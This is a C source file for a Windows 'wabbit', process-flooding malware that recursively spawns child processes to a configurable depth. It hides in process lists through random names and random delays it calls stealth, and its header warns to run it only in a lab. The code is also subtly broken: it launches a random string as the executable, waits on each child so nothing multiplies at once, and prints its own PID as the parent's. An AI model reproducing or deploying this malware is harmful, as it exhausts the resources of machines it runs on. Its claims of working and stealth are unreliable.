// So uhhh, I decided to port this to Windows because, why not.
// Saw a wabbit/worm in action on YouTube, got curious, and here we are.
// DO NOT run outside a VM or lab. You will NOT have a good time.

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

#define MAX_DEPTH 500 // Turn this up for more power

// Just makes a random name.
// Not bulletproof but makes the list look a little messier.
void randomize_procname(char *buf, size_t buflen)
{
    const char charset[] = "abcdefghijklmnopqrstuvwxyz0123456789";
    int namelen = 6 + rand() % 6; // length: 6-12
    for (int i = 0; i < namelen && i < buflen - 1; ++i)
        buf[i] = charset[rand() % (sizeof(charset) - 1)];
    buf[namelen] = '\0';
}

void wabbit(int depth)
{
    // Don't go past safe depth unless you want death.
    if (depth > MAX_DEPTH)
        return;

    srand((unsigned int)(time(NULL) ^ GetCurrentProcessId()));

    // Stealth mode: random delay so process tree isn't perfectly regular.
    int delay = rand() % 2;
    if (delay)
        Sleep(delay * 1000);

    // Print info so you know it’s working. Comment out for stealth.
    printf("[wabbit] depth=%d pid=%lu ppid=%lu\n", depth, GetCurrentProcessId(), GetCurrentProcessId()); // Note: Getting PPID in Windows takes extra code
    // TODO: Implement PPID retrieval
    // Prepare randomized process name and next depth arg
    char procname[20];
    randomize_procname(procname, sizeof(procname));

    char cmdline[128];
    snprintf(cmdline, sizeof(cmdline), "%s %d", procname, depth + 1);

    // Actually launch a child wabbit process
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    // Spawn one child
    if (CreateProcessA(
            NULL,               // Application name (NULL means use command line)
            cmdline,            // Command line (random arg0 + depth)
            NULL, NULL,         // Process/thread security
            FALSE,              // No handle inheritance
            CREATE_NEW_CONSOLE, // Give it its own console
            NULL, NULL,         // Env/block, cwd
            &si, &pi))
    {
        // Wait for child to finish so we don't pile up zombies
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    else
    {
        fprintf(stderr, "CreateProcess failed (%ld)\n", GetLastError());
    }

    // Sometimes spawn a second child for exponential chaos
    if (rand() % 2)
    {
        char procname2[20];
        randomize_procname(procname2, sizeof(procname2));
        char cmdline2[128];
        snprintf(cmdline2, sizeof(cmdline2), "%s %d", procname2, depth + 1);

        STARTUPINFOA si2;
        PROCESS_INFORMATION pi2;
        ZeroMemory(&si2, sizeof(si2));
        si2.cb = sizeof(si2);
        ZeroMemory(&pi2, sizeof(pi2));

        if (CreateProcessA(
                NULL,
                cmdline2,
                NULL, NULL,
                FALSE,
                CREATE_NEW_CONSOLE,
                NULL, NULL,
                &si2, &pi2))
        {
            WaitForSingleObject(pi2.hProcess, INFINITE);
            CloseHandle(pi2.hProcess);
            CloseHandle(pi2.hThread);
        }
        else
        {
            fprintf(stderr, "CreateProcess failed (%ld)\n", GetLastError());
        }
    }
}

int main(int argc, char **argv)
{
    // Start deep if you want, otherwise begin at zero.
    int depth = 0;
    if (argc > 1)
        depth = atoi(argv[1]);

    wabbit(depth);
    return 0;
}

// Enjoy the family